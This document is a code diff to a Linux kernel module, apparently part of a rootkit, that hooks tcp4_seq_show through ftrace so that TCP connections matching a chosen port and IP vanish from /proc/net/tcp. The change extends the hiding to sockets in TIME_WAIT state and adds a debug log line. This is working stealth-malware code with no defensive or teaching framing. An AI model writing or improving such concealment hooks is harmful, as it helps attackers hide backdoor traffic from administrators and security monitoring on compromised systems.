@@ -3,6 +3,7 @@
 #include <linux/slab.h>
 #include <linux/ftrace.h>
 #include <net/inet_sock.h>
+#include <net/inet_timewait_sock.h>
 #include "../common/stringify/to_string.h"
 #include "../common/ftrace_hooking/ftrace_hook.h"
 
@@ -16,6 +17,32 @@ module_param(port_to_hide, int, 0600);
 typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
 static struct fthook hook;
 
+struct sock_info {
+    __be32 ipaddr;
+    __u16 port;
+};
+
+struct sock_info get_sock_info(struct sock *sk) {
+    struct sock_info sk_info;
+
+    switch (sk->sk_state) {
+        case TCP_TIME_WAIT: {
+            struct inet_timewait_sock *tw = (struct inet_timewait_sock*)sk;
+            sk_info.ipaddr = tw->tw_rcv_saddr;
+            sk_info.port = ntohs(tw->tw_sport);
+            break;
+        }
+        default: {
+            struct inet_sock *inet = inet_sk(sk);
+            sk_info.ipaddr = inet->inet_saddr;
+            sk_info.port = ntohs(inet->inet_sport);
+            break;
+        }
+    }
+
+    return sk_info;
+}
+
 int new_tcp4_seq_show(struct seq_file *seq, void *v) {
     original_tcp4_seq_show_t original_tcp4_seq_ptr = (original_tcp4_seq_show_t)hook.original_function_address;
 
@@ -24,14 +51,13 @@ int new_tcp4_seq_show(struct seq_file *seq, void *v) {
     }
 
     struct sock *sk = v;
-    const struct inet_sock *inet = inet_sk(sk);
-    __be32 ipaddr = inet->inet_saddr;
-    __u16 port = ntohs(inet->inet_sport);
+    struct sock_info sk_info = get_sock_info(sk);
     
     char *ipstring = kmalloc(IP_STRING_MAX_LEN, GFP_KERNEL);
-    ipaddr_to_string(ipaddr, ipstring);
-    if (((ip_to_hide == NULL) && (port == port_to_hide)) || ((ip_to_hide != NULL) && !strcmp(ipstring, ip_to_hide) && (port == port_to_hide))) {
-        pr_info("Hiding %s : %u", ipstring, port);
+    ipaddr_to_string(sk_info.ipaddr, ipstring);
+    pr_info("%p %s:%d", seq, ipstring, sk_info.port);
+    if (((ip_to_hide == NULL) && (sk_info.port == port_to_hide)) || ((ip_to_hide != NULL) && !strcmp(ipstring, ip_to_hide) && (sk_info.port == port_to_hide))) {
+        pr_info("Hiding %s : %u", ipstring, sk_info.port);
         kfree(ipstring);
         return 0;
     }
